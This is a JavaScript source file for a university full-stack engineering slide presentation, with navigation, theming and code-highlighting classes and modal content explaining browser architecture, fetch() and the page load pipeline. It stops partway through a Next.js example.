/**
 * Full Stack Engineering Presentations
 * Ohad Assulin, RU
 */

// Lecture Manager - handles menu and lecture loading
class LectureManager {
    constructor() {
        this.menu = document.getElementById('lectureMenu');
        this.presentation = document.getElementById('presentation');
        this.backButton = document.getElementById('backToMenu');
        this.currentLecture = null;
        this.presentation_instance = null;

        this.init();
    }

    init() {
        // Check URL hash for direct lecture link
        const hash = window.location.hash.slice(1);
        if (hash) {
            this.loadLecture(hash);
        }

        // Bind lecture card clicks
        document.querySelectorAll('.lecture-card').forEach(card => {
            card.addEventListener('click', () => {
                const lectureId = card.dataset.lecture;
                this.loadLecture(lectureId);
            });
        });

        // Back to menu button
        this.backButton?.addEventListener('click', () => this.showMenu());

        // Keyboard shortcut for menu
        document.addEventListener('keydown', (e) => {
            if (e.key === 'm' || e.key === 'M') {
                if (this.currentLecture) {
                    this.showMenu();
                }
            }
        });

        // Handle browser back button
        window.addEventListener('popstate', () => {
            const hash = window.location.hash.slice(1);
            if (hash) {
                this.loadLecture(hash, false);
            } else {
                this.showMenu(false);
            }
        });
    }

    async loadLecture(lectureId, updateHistory = true) {
        try {
            const response = await fetch(`lectures/${lectureId}.html`);
            if (!response.ok) throw new Error('Lecture not found');

            const html = await response.text();
            this.presentation.innerHTML = html;
            this.currentLecture = lectureId;

            // Update URL
            if (updateHistory) {
                window.location.hash = lectureId;
            }

            // Hide menu, show presentation UI
            this.menu.style.display = 'none';
            this.backButton.style.display = 'flex';
            document.querySelector('.progress-nav').style.display = 'flex';
            document.querySelector('.course-info').style.display = 'flex';
            document.querySelector('.slide-nav').style.display = 'flex';
            document.querySelector('.keyboard-hint').style.display = 'flex';

            // Initialize presentation
            this.presentation_instance = new Presentation();
            new CodeHighlighter();
            new InteractiveElements();
            new ArchitectureModal();

        } catch (error) {
            console.error('Failed to load lecture:', error);
            this.showMenu();
        }
    }

    showMenu(updateHistory = true) {
        this.menu.style.display = 'flex';
        this.backButton.style.display = 'none';
        document.querySelector('.progress-nav').style.display = 'none';
        document.querySelector('.course-info').style.display = 'none';
        document.querySelector('.slide-nav').style.display = 'none';
        document.querySelector('.keyboard-hint').style.display = 'none';

        this.presentation.innerHTML = '';
        this.currentLecture = null;

        if (updateHistory) {
            window.location.hash = '';
        }
    }
}

class Presentation {
    constructor() {
        this.slides = document.querySelectorAll('.slide');
        this.currentIndex = 0;
        this.isAnimating = false;
        this.touchStartX = 0;
        this.touchEndX = 0;

        this.init();
    }

    init() {
        this.updateSlideCounter();
        this.bindEvents();
        this.initializeFirstSlide();
    }

    initializeFirstSlide() {
        const firstSlide = this.slides[0];
        if (firstSlide) {
            firstSlide.classList.add('active');
            this.animateSlideContent(firstSlide);
        }
    }

    bindEvents() {
        // Keyboard navigation
        document.addEventListener('keydown', (e) => this.handleKeydown(e));

        // Button navigation
        const prevBtn = document.querySelector('.nav-btn.prev');
        const nextBtn = document.querySelector('.nav-btn.next');

        prevBtn?.addEventListener('click', () => this.prevSlide());
        nextBtn?.addEventListener('click', () => this.nextSlide());

        // Touch navigation
        document.addEventListener('touchstart', (e) => {
            this.touchStartX = e.changedTouches[0].screenX;
        });

        document.addEventListener('touchend', (e) => {
            this.touchEndX = e.changedTouches[0].screenX;
            this.handleSwipe();
        });

        // Wheel navigation (with debounce)
        let wheelTimeout;
        document.addEventListener('wheel', (e) => {
            if (wheelTimeout) return;
            wheelTimeout = setTimeout(() => {
                wheelTimeout = null;
            }, 300);

            if (e.deltaY > 50) {
                this.nextSlide();
            } else if (e.deltaY < -50) {
                this.prevSlide();
            }
        }, { passive: true });

        // Fullscreen toggle
        document.addEventListener('keydown', (e) => {
            if (e.key === 'f' || e.key === 'F') {
                this.toggleFullscreen();
            }
        });
    }

    handleKeydown(e) {
        switch (e.key) {
            case 'ArrowRight':
            case 'ArrowDown':
            case ' ':
            case 'Enter':
                e.preventDefault();
                this.nextSlide();
                break;
            case 'ArrowLeft':
            case 'ArrowUp':
            case 'Backspace':
                e.preventDefault();
                this.prevSlide();
                break;
            case 'Home':
                e.preventDefault();
                this.goToSlide(0);
                break;
            case 'End':
                e.preventDefault();
                this.goToSlide(this.slides.length - 1);
                break;
        }
    }

    handleSwipe() {
        const swipeThreshold = 50;
        const diff = this.touchStartX - this.touchEndX;

        if (Math.abs(diff) > swipeThreshold) {
            if (diff > 0) {
                this.nextSlide();
            } else {
                this.prevSlide();
            }
        }
    }

    nextSlide() {
        if (this.currentIndex < this.slides.length - 1) {
            this.goToSlide(this.currentIndex + 1);
        }
    }

    prevSlide() {
        if (this.currentIndex > 0) {
            this.goToSlide(this.currentIndex - 1);
        }
    }

    goToSlide(index) {
        if (this.isAnimating || index === this.currentIndex) return;
        if (index < 0 || index >= this.slides.length) return;

        this.isAnimating = true;

        const currentSlide = this.slides[this.currentIndex];
        const nextSlide = this.slides[index];
        const direction = index > this.currentIndex ? 'next' : 'prev';

        // Remove active class and add exit direction class
        currentSlide.classList.remove('active');
        if (direction === 'next') {
            currentSlide.classList.add('prev');
        } else {
            currentSlide.classList.add('next');
        }

        // Set entry position for new slide before making it active
        if (direction === 'next') {
            nextSlide.classList.remove('prev');
        } else {
            nextSlide.classList.add('prev');
        }

        // Small delay to ensure CSS transition works
        requestAnimationFrame(() => {
            nextSlide.classList.remove('prev', 'next');
            nextSlide.classList.add('active');

            // Animate content
            this.animateSlideContent(nextSlide);
        });

        // Update state
        this.currentIndex = index;
        this.updateSlideCounter();
        this.updateProgress();

        // Clean up after animation
        setTimeout(() => {
            currentSlide.classList.remove('prev', 'next');
            this.isAnimating = false;
        }, 500);
    }

    animateSlideContent(slide) {
        const content = slide.querySelector('.slide-content');
        if (!content) return;

        // Reset animation
        content.style.animation = 'none';
        content.offsetHeight; // Trigger reflow
        content.style.animation = null;

        // Stagger animate child elements
        const animatableElements = content.querySelectorAll(
            '.feature-card, .improvement, .timeline-item, .method-row:not(.header), ' +
            '.status-category, .flow-step, .attribute-card, .problem-card, ' +
            '.h2-feature, .idea-card, .standard-col, .v8-card, .feature-item, ' +
            '.tool-card, .future-item, .takeaway, .pipeline-step, .benefit, ' +
            '.landscape-card, .lifecycle-step, .server-item, .benefit-card, ' +
            '.timeline-entry, .loop-phase, .combinator-card, .pattern-card, ' +
            '.gotcha-card, .render-mode, .component-box, .prod-card, .eco-category'
        );

        animatableElements.forEach((el, i) => {
            el.style.opacity = '0';
            el.style.transform = 'translateY(20px)';

            setTimeout(() => {
                el.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
                el.style.opacity = '1';
                el.style.transform = 'translateY(0)';
            }, 100 + (i * 50));
        });
    }

    updateSlideCounter() {
        const current = document.querySelector('.slide-counter .current');
        const total = document.querySelector('.slide-counter .total');

        if (current && total) {
            current.textContent = String(this.currentIndex + 1).padStart(2, '0');
            total.textContent = String(this.slides.length).padStart(2, '0');
        }
    }

    updateProgress() {
        const progressFill = document.querySelector('.progress-fill');
        if (progressFill) {
            const progress = ((this.currentIndex + 1) / this.slides.length) * 100;
            progressFill.style.width = `${progress}%`;
        }
    }

    toggleFullscreen() {
        if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
                console.log('Fullscreen not supported:', err);
            });
        } else {
            document.exitFullscreen();
        }
    }
}

// Theme Toggle
class ThemeToggle {
    constructor() {
        this.toggle = document.querySelector('.theme-toggle');
        this.init();
    }

    init() {
        const savedTheme = localStorage.getItem('presentation-theme');
        if (savedTheme) {
            document.documentElement.setAttribute('data-theme', savedTheme);
        }

        this.toggle?.addEventListener('click', () => this.toggleTheme());

        document.addEventListener('keydown', (e) => {
            if (e.key === 't' || e.key === 'T') {
                this.toggleTheme();
            }
        });
    }

    toggleTheme() {
        const currentTheme = document.documentElement.getAttribute('data-theme');
        const newTheme = currentTheme === 'light' ? 'dark' : 'light';

        document.documentElement.setAttribute('data-theme', newTheme);
        localStorage.setItem('presentation-theme', newTheme);

        if (newTheme === 'dark') {
            document.documentElement.removeAttribute('data-theme');
            localStorage.removeItem('presentation-theme');
        }
    }
}

// Code syntax highlighting enhancement
class CodeHighlighter {
    constructor() {
        this.highlightAll();
    }

    highlightAll() {
        document.querySelectorAll('pre code').forEach(block => {
            this.highlight(block);
        });
    }

    highlight(element) {
        let html = element.innerHTML;

        // Skip if already highlighted or contains pre-existing spans with classes
        if (element.dataset.highlighted) return;
        if (html.includes('class="method"') || html.includes('class="line"') || html.includes('class=')) {
            element.dataset.highlighted = 'true';
            return;
        }

        // Process strings and comments FIRST (before adding spans with class attributes)
        // Use placeholders to avoid conflicts
        const strings = [];
        const comments = [];

        // Extract and replace strings with placeholders
        html = html.replace(/"([^"]+)"/g, (match, p1) => {
            strings.push(p1);
            return `__STRING_${strings.length - 1}__`;
        });

        // Extract and replace comments with placeholders
        html = html.replace(/(\/\/[^\n]*)/g, (match) => {
            comments.push(match);
            return `__COMMENT_${comments.length - 1}__`;
        });

        // HTTP methods
        html = html.replace(
            /\b(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS|CONNECT|TRACE)\b/g,
            '<span class="method">$1</span>'
        );

        // HTTP version
        html = html.replace(
            /(HTTP\/[\d.]+)/g,
            '<span class="version">$1</span>'
        );

        // Status codes
        html = html.replace(
            /\b(\d{3})\s+(OK|Created|Accepted|No Content|Moved Permanently|Found|Not Modified|Bad Request|Unauthorized|Forbidden|Not Found|Internal Server Error|Bad Gateway|Service Unavailable)/g,
            '<span class="status-ok">$1 $2</span>'
        );

        // Headers
        html = html.replace(
            /^([A-Za-z-]+):/gm,
            '<span class="header-name">$1:</span>'
        );

        // Restore strings with highlighting
        strings.forEach((str, i) => {
            html = html.replace(`__STRING_${i}__`, `<span class="json">"${str}"</span>`);
        });

        // Restore comments with highlighting
        comments.forEach((comment, i) => {
            html = html.replace(`__COMMENT_${i}__`, `<span style="color: var(--text-dim)">${comment}</span>`);
        });

        element.innerHTML = html;
        element.dataset.highlighted = 'true';
    }
}

// Interactive elements
class InteractiveElements {
    constructor() {
        this.initCodeCopy();
        this.initHoverEffects();
    }

    initCodeCopy() {
        document.querySelectorAll('.code-block, .code-annotated').forEach(block => {
            block.style.cursor = 'pointer';
            block.title = 'Click to copy';

            block.addEventListener('click', async () => {
                const text = block.textContent;
                try {
                    await navigator.clipboard.writeText(text);
                    this.showToast('Copied to clipboard!');
                } catch (err) {
                    console.error('Copy failed:', err);
                }
            });
        });
    }

    initHoverEffects() {
        // Add glow effect on hover for feature cards
        document.querySelectorAll('.feature-card, .idea-card, .future-item').forEach(card => {
            card.addEventListener('mouseenter', function() {
                this.style.boxShadow = '0 0 30px rgba(103, 232, 249, 0.1)';
            });

            card.addEventListener('mouseleave', function() {
                this.style.boxShadow = '';
            });
        });
    }

    showToast(message) {
        const toast = document.createElement('div');
        toast.className = 'toast';
        toast.textContent = message;
        toast.style.cssText = `
            position: fixed;
            bottom: 100px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--accent-green);
            color: var(--bg-primary);
            padding: 0.75rem 1.5rem;
            border-radius: 0.5rem;
            font-family: var(--font-mono);
            font-size: 0.875rem;
            z-index: 9999;
            animation: fadeInOut 2s ease forwards;
        `;

        const style = document.createElement('style');
        style.textContent = `
            @keyframes fadeInOut {
                0% { opacity: 0; transform: translateX(-50%) translateY(20px); }
                20% { opacity: 1; transform: translateX(-50%) translateY(0); }
                80% { opacity: 1; transform: translateX(-50%) translateY(0); }
                100% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
            }
        `;
        document.head.appendChild(style);

        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 2000);
    }
}

// Preloader animation
class Preloader {
    constructor() {
        this.show();
    }

    show() {
        const preloader = document.createElement('div');
        preloader.id = 'preloader';
        preloader.innerHTML = `
            <div class="preloader-content">
                <div class="preloader-text">Loading...</div>
                <div class="preloader-bar">
                    <div class="preloader-fill"></div>
                </div>
            </div>
        `;
        preloader.style.cssText = `
            position: fixed;
            inset: 0;
            background: var(--bg-primary);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            transition: opacity 0.5s ease;
        `;

        const style = document.createElement('style');
        style.textContent = `
            .preloader-content {
                text-align: center;
            }
            .preloader-text {
                font-family: var(--font-mono);
                font-size: 0.875rem;
                color: var(--text-muted);
                margin-bottom: 1rem;
                letter-spacing: 0.1em;
            }
            .preloader-bar {
                width: 200px;
                height: 2px;
                background: var(--bg-tertiary);
                border-radius: 1px;
                overflow: hidden;
            }
            .preloader-fill {
                height: 100%;
                background: linear-gradient(90deg, var(--accent-cyan), var(--accent-purple));
                animation: preload 1.5s ease-in-out forwards;
            }
            @keyframes preload {
                0% { width: 0%; }
                100% { width: 100%; }
            }
        `;
        document.head.appendChild(style);

        document.body.appendChild(preloader);

        // Hide after fonts load
        document.fonts.ready.then(() => {
            setTimeout(() => {
                preloader.style.opacity = '0';
                setTimeout(() => preloader.remove(), 500);
            }, 800);
        });
    }
}

// Architecture Modal
class ArchitectureModal {
    constructor() {
        this.modal = document.getElementById('archModal');
        this.titleEl = document.getElementById('modalTitle');
        this.bodyEl = document.getElementById('modalBody');
        this.content = this.getModalContent();
        this.init();
    }

    getModalContent() {
        return {
            ui: {
                title: 'User Interface',
                body: `
                    <p>The <strong>User Interface</strong> is everything you see in the browser window except the webpage itself.</p>
                    <ul>
                        <li><strong>Address Bar</strong> — where you type URLs and see the current location</li>
                        <li><strong>Navigation Buttons</strong> — back, forward, refresh, home</li>
                        <li><strong>Bookmarks Bar</strong> — quick access to saved pages</li>
                        <li><strong>Tabs</strong> — manage multiple pages simultaneously</li>
                        <li><strong>Menu & Settings</strong> — browser configuration</li>
                    </ul>
                    <div class="modal-section">
                        <div class="modal-section-title">Fun Fact</div>
                        <p>Chrome's minimalist UI was revolutionary in 2008 — maximizing content area by hiding most controls.</p>
                    </div>
                `
            },
            engine: {
                title: 'Browser Engine',
                body: `
                    <p>The <strong>Browser Engine</strong> is the coordinator that bridges the UI and the rendering engine.</p>
                    <ul>
                        <li><strong>Marshals Actions</strong> — translates UI commands into rendering actions</li>
                        <li><strong>Manages State</strong> — handles history, sessions, and navigation</li>
                        <li><strong>Coordinates Components</strong> — orchestrates rendering, networking, and JS execution</li>
                        <li><strong>Handles IPC</strong> — inter-process communication in multi-process browsers</li>
                    </ul>
                    <div class="modal-section">
                        <div class="modal-section-title">Examples</div>
                        <p><code>Gecko</code> (Firefox), <code>WebKit</code> (Safari), <code>Blink</code> (Chrome/Edge)</p>
                    </div>
                `
            },
            render: {
                title: 'Rendering Engine',
                body: `
                    <p>The <strong>Rendering Engine</strong> parses HTML/CSS and paints pixels to your screen.</p>
                    <ul>
                        <li><strong>HTML Parser</strong> — converts markup into the DOM tree</li>
                        <li><strong>CSS Parser</strong> — creates CSSOM from stylesheets</li>
                        <li><strong>Render Tree</strong> — combines DOM + CSSOM for visible elements</li>
                        <li><strong>Layout</strong> — calculates geometry (position, size)</li>
                        <li><strong>Paint</strong> — draws pixels to layers</li>
                        <li><strong>Composite</strong> — combines layers for final output</li>
                    </ul>
                    <div class="modal-section">
                        <div class="modal-section-title">Major Engines</div>
                        <p><code>Blink</code> (Chrome, Edge, Opera) • <code>Gecko</code> (Firefox) • <code>WebKit</code> (Safari)</p>
                    </div>
                `
            },
            js: {
                title: 'JavaScript Engine',
                body: `
                    <p>The <strong>JS Engine</strong> executes JavaScript code with blazing speed.</p>
                    <ul>
                        <li><strong>Parser</strong> — converts JS source to Abstract Syntax Tree</li>
                        <li><strong>Interpreter</strong> — executes bytecode quickly</li>
                        <li><strong>JIT Compiler</strong> — optimizes hot code paths to machine code</li>
                        <li><strong>Garbage Collector</strong> — automatic memory management</li>
                        <li><strong>Event Loop</strong> — handles async operations</li>
                    </ul>
                    <div class="modal-section">
                        <div class="modal-section-title">Major Engines</div>
                        <p><code>V8</code> (Chrome, Node.js) • <code>SpiderMonkey</code> (Firefox) • <code>JavaScriptCore</code> (Safari)</p>
                    </div>
                `
            },
            network: {
                title: 'Networking Layer',
                body: `
                    <p>The <strong>Networking Layer</strong> handles all communication with remote servers.</p>
                    <ul>
                        <li><strong>HTTP/HTTPS</strong> — fetches web resources</li>
                        <li><strong>DNS Resolution</strong> — converts domains to IP addresses</li>
                        <li><strong>TLS/SSL</strong> — encrypts connections for security</li>
                        <li><strong>WebSocket</strong> — persistent bidirectional connections</li>
                        <li><strong>Connection Pooling</strong> — reuses TCP connections</li>
                        <li><strong>Cache Management</strong> — stores responses for reuse</li>
                    </ul>
                    <div class="modal-section">
                        <div class="modal-section-title">Protocols Supported</div>
                        <p><code>HTTP/1.1</code> • <code>HTTP/2</code> • <code>HTTP/3 (QUIC)</code> • <code>WebSocket</code> • <code>WebRTC</code></p>
                    </div>
                `
            },
            storage: {
                title: 'Data Storage',
                body: `
                    <p>The <strong>Data Storage</strong> layer persists data locally in the browser.</p>
                    <ul>
                        <li><strong>Cookies</strong> — small key-value pairs sent with requests (4KB limit)</li>
                        <li><strong>LocalStorage</strong> — synchronous storage (~5MB per origin)</li>
                        <li><strong>SessionStorage</strong> — like LocalStorage but per-tab</li>
                        <li><strong>IndexedDB</strong> — full database with indexes (~50MB+)</li>
                        <li><strong>Cache API</strong> — stores request/response pairs for offline</li>
                    </ul>
                    <div class="modal-section">
                        <div class="modal-section-title">Security Note</div>
                        <p>All storage is <strong>origin-isolated</strong> — <code>example.com</code> cannot access data from <code>other.com</code></p>
                    </div>
                `
            },
            os: {
                title: 'OS Interface',
                body: `
                    <p>The <strong>OS Interface</strong> bridges the browser with the operating system.</p>
                    <ul>
                        <li><strong>Display</strong> — rendering to screen via graphics APIs (OpenGL, DirectX, Metal)</li>
                        <li><strong>Input</strong> — keyboard, mouse, touch, gamepad events</li>
                        <li><strong>File System</strong> — download/upload files, File System Access API</li>
                        <li><strong>Clipboard</strong> — copy/paste operations</li>
                        <li><strong>Notifications</strong> — system notification API</li>
                        <li><strong>GPU Acceleration</strong> — hardware-accelerated rendering</li>
                    </ul>
                    <div class="modal-section">
                        <div class="modal-section-title">Process Model</div>
                        <p>Modern browsers use <strong>multi-process architecture</strong> — each tab runs in a sandboxed process for security and stability.</p>
                    </div>
                `
            },
            'ajax-code': {
                title: 'XHR vs fetch() — Code Comparison',
                body: `
                    <p>The evolution from <strong>XMLHttpRequest</strong> to <strong>fetch()</strong> — cleaner, Promise-based, modern.</p>
                    <div class="code-comparison">
                        <div class="code-panel">
                            <div class="code-panel-header old">XMLHttpRequest (2005-2015)</div>
                            <pre class="modal-code"><code>// The old way - callback hell
var xhr = new XMLHttpRequest();
xhr.open('GET', '/api/users');
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    if (xhr.status === 200) {
      var data = JSON.parse(xhr.responseText);
      console.log(data);
    } else {
      console.error('Error:', xhr.status);
    }
  }
};
xhr.onerror = function() {
  console.error('Network error');
};
xhr.send();</code></pre>
                        </div>
                        <div class="code-panel">
                            <div class="code-panel-header new">fetch() + async/await (2015+)</div>
                            <pre class="modal-code"><code>// The modern way - clean & readable
async function getUsers() {
  try {
    const response = await fetch('/api/users');

    if (!response.ok) {
      throw new Error(\`HTTP \${response.status}\`);
    }

    const data = await response.json();
    console.log(data);
  } catch (error) {
    console.error('Error:', error);
  }
}</code></pre>
                        </div>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">POST Request Comparison</div>
                        <div class="code-comparison">
                            <div class="code-panel">
                                <div class="code-panel-header old">XHR POST</div>
                                <pre class="modal-code"><code>var xhr = new XMLHttpRequest();
xhr.open('POST', '/api/users');
xhr.setRequestHeader('Content-Type',
  'application/json');
xhr.onload = function() {
  if (xhr.status === 201) {
    console.log('Created!');
  }
};
xhr.send(JSON.stringify({
  name: 'Alice',
  email: 'alice@example.com'
}));</code></pre>
                            </div>
                            <div class="code-panel">
                                <div class="code-panel-header new">fetch() POST</div>
                                <pre class="modal-code"><code>const response = await fetch('/api/users', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    name: 'Alice',
    email: 'alice@example.com'
  })
});

const newUser = await response.json();</code></pre>
                            </div>
                        </div>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Why fetch() Won</div>
                        <ul>
                            <li><strong>Promise-based</strong> — chainable, works with async/await</li>
                            <li><strong>Cleaner API</strong> — no readyState checks</li>
                            <li><strong>Streaming</strong> — response body is a ReadableStream</li>
                            <li><strong>Request/Response objects</strong> — powerful abstraction</li>
                        </ul>
                    </div>
                `
            },
            // Page Load Flow Steps
            'step-dns': {
                title: '1. DNS Lookup',
                body: `
                    <p>The browser needs to find the <strong>IP address</strong> of the server.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>Browser: "Where is example.com?"

1. Check browser DNS cache
2. Check OS DNS cache
3. Query DNS resolver (ISP/Google 8.8.8.8)
4. Resolver queries root → .com → example.com

Response: 93.184.216.34</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Time Impact</div>
                        <p><strong>~20-120ms</strong> for uncached lookups. DNS caching and DNS-over-HTTPS help reduce this.</p>
                    </div>
                `
            },
            'step-tcp': {
                title: '2. TCP + TLS Handshake',
                body: `
                    <p>Establish a <strong>secure connection</strong> to the server.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>TCP 3-Way Handshake:
  Client → SYN →           Server
  Client ← SYN-ACK ←       Server
  Client → ACK →           Server

TLS 1.3 Handshake (1-RTT):
  Client → ClientHello + KeyShare →    Server
  Client ← ServerHello + Certificate ← Server
  Client → Finished →                  Server
  🔒 Encrypted connection ready!</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Time Impact</div>
                        <p><strong>~50-150ms</strong> depending on distance. HTTP/3 (QUIC) reduces this to 0-RTT for repeat visits!</p>
                    </div>
                `
            },
            'step-html-request': {
                title: '3. HTTP Request for HTML',
                body: `
                    <p>Browser sends the <strong>initial request</strong> for the page.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>GET /index.html HTTP/1.1
Host: example.com
User-Agent: Chrome/120.0
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session_id=abc123</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Key Headers</div>
                        <p><code>Accept</code> tells server what formats we want. <code>Accept-Encoding</code> enables compression (huge bandwidth savings!).</p>
                    </div>
                `
            },
            'step-html-response': {
                title: '4. HTML Response',
                body: `
                    <p>Server returns the <strong>HTML document</strong>.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Encoding: gzip
Content-Length: 4523
Cache-Control: max-age=3600

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;link rel="stylesheet" href="/styles.css"&gt;
  &lt;title&gt;My Page&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;h1&gt;Hello World&lt;/h1&gt;
  &lt;script src="/app.js"&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">TTFB (Time to First Byte)</div>
                        <p>Measured from request sent to first byte received. Target: <strong>&lt;200ms</strong> for good performance.</p>
                    </div>
                `
            },
            'step-parse-html': {
                title: '5. Parse HTML → DOM Tree',
                body: `
                    <p>Browser reads HTML bytes and builds the <strong>Document Object Model</strong>.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>HTML Bytes → Characters → Tokens → Nodes → DOM

&lt;html&gt;                    Document
  &lt;head&gt;          →         ├── html
    &lt;title&gt;                 │   ├── head
  &lt;/head&gt;                   │   │   └── title
  &lt;body&gt;                    │   └── body
    &lt;h1&gt;Hello&lt;/h1&gt;          │       ├── h1
  &lt;/body&gt;                   │       │   └── "Hello"
&lt;/html&gt;                     │       └── ...</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Preload Scanner</div>
                        <p>While building DOM, a secondary parser scans ahead to discover resources (CSS, JS, images) and start fetching early!</p>
                    </div>
                `
            },
            'step-discover-css': {
                title: '6. Discover CSS → New HTTP Request',
                body: `
                    <p>Parser finds <code>&lt;link rel="stylesheet"&gt;</code> — triggers <strong>another HTTP request</strong>!</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>&lt;link rel="stylesheet" href="/styles.css"&gt;

Browser immediately sends:

GET /styles.css HTTP/1.1
Host: example.com
Accept: text/css
Referer: https://example.com/index.html

Response: 200 OK
Content-Type: text/css
Body: body { font-family: sans-serif; }...</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Render Blocking!</div>
                        <p>CSS is <strong>render-blocking</strong> — browser won't paint until CSSOM is ready. Critical CSS should be inlined or loaded ASAP.</p>
                    </div>
                `
            },
            'step-parse-css': {
                title: '7. Parse CSS → CSSOM',
                body: `
                    <p>Browser parses CSS into the <strong>CSS Object Model</strong> (CSSOM).</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>CSS Rules → CSSOM Tree

body {                     CSSOM
  font: 16px Arial;   →    ├── body
  color: #333;             │   font: 16px Arial
}                          │   color: #333
h1 {                       ├── h1
  font-size: 2em;          │   font-size: 2em
  color: blue;             │   color: blue
}                          └── .btn
.btn { ... }                   ...</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Specificity & Cascade</div>
                        <p>Browser computes final styles by applying cascade rules: specificity, source order, !important.</p>
                    </div>
                `
            },
            'step-discover-js': {
                title: '8. Discover JS → Parser Blocked!',
                body: `
                    <p>Parser finds <code>&lt;script src&gt;</code> — <strong>stops parsing</strong> to fetch and execute!</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>&lt;script src="/app.js"&gt;&lt;/script&gt;

1. Parser STOPS (blocking!)
2. Fetch /app.js (another HTTP request)
3. Parse JavaScript
4. Execute JavaScript
5. Resume HTML parsing

Solutions:
&lt;script defer src="/app.js"&gt;&lt;/script&gt;  // Parse, exec after DOM
&lt;script async src="/app.js"&gt;&lt;/script&gt;  // Parse parallel, exec ASAP</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Best Practice</div>
                        <p>Use <code>defer</code> for most scripts, <code>async</code> for analytics. Place scripts at end of body or use <code>defer</code>.</p>
                    </div>
                `
            },
            'step-render-tree': {
                title: '9. Build Render Tree',
                body: `
                    <p>Combine DOM + CSSOM into the <strong>Render Tree</strong> — only visible elements!</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>DOM + CSSOM = Render Tree

DOM:                 CSSOM:              Render Tree:
├── html             body { color: #333 }    ├── body
│   ├── head         h1 { color: blue }      │   ├── h1
│   │   └── title    .hidden { display:none }│   │   "Hello"
│   └── body                                 │   └── p
│       ├── h1                               │       "World"
│       ├── p
│       └── div.hidden   ← NOT in render tree!</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Excluded Elements</div>
                        <p><code>display: none</code>, <code>&lt;head&gt;</code>, <code>&lt;script&gt;</code> — not in render tree. <code>visibility: hidden</code> IS included (takes space).</p>
                    </div>
                `
            },
            'step-layout': {
                title: '10. Layout (Reflow)',
                body: `
                    <p>Calculate <strong>exact position and size</strong> of every element.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>Viewport: 1200px × 800px

body (block)
├── x: 0, y: 0
├── width: 1200px, height: auto
│
├── h1 (block)
│   ├── x: 0, y: 0
│   ├── width: 1200px, height: 40px
│
├── p (block)
│   ├── x: 0, y: 40px
│   ├── width: 1200px, height: 20px
│
└── div.container (flex)
    ├── child1: x: 0, width: 400px
    ├── child2: x: 400, width: 400px
    └── child3: x: 800, width: 400px</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Performance Warning</div>
                        <p>Layout is expensive! Avoid forced reflows: reading <code>offsetHeight</code> then writing styles triggers sync layout.</p>
                    </div>
                `
            },
            'step-paint': {
                title: '11. Paint',
                body: `
                    <p>Convert render tree into <strong>paint instructions</strong> for each layer.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>Paint Operations (per layer):

Layer 1 (main):
  1. Fill background #ffffff
  2. Draw text "Hello" at (100, 50), blue, 32px
  3. Draw text "World" at (100, 100), #333, 16px
  4. Draw border 1px solid #ccc at (90, 40, 200, 80)

Layer 2 (fixed header):
  1. Fill background rgba(0,0,0,0.9)
  2. Draw text "Menu" at (20, 15), white

Paint order: backgrounds → borders → text → outlines</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Layers</div>
                        <p>Elements with <code>transform</code>, <code>opacity</code>, <code>will-change</code>, or <code>position: fixed</code> get their own GPU layer.</p>
                    </div>
                `
            },
            'step-composite': {
                title: '12. Composite → Pixels!',
                body: `
                    <p>GPU combines all layers and <strong>draws to the screen</strong>!</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>Compositor Thread (GPU):

1. Receive paint layers from main thread
2. Rasterize tiles (convert to pixels)
3. Composite layers in correct order (z-index)
4. Send to display buffer

Frame complete! 🖥️

Target: 60fps = 16.67ms per frame
Budget: ~10ms for JS, 6ms for render pipeline</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Why Composite-Only is Fast</div>
                        <p>Animations using only <code>transform</code> and <code>opacity</code> skip Layout and Paint — handled entirely by GPU!</p>
                    </div>
                `
            },
            // Next.js Rendering Strategies (Slide 29)
            'render-ssg': {
                title: 'Static Site Generation (SSG)',
                body: `
                    <p><strong>SSG</strong> generates HTML at <strong>build time</strong> — the fastest possible delivery.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// pages/blog/[slug].js (Pages Router)
export async function getStaticPaths() {
  const posts = await getAllPosts();
  return {
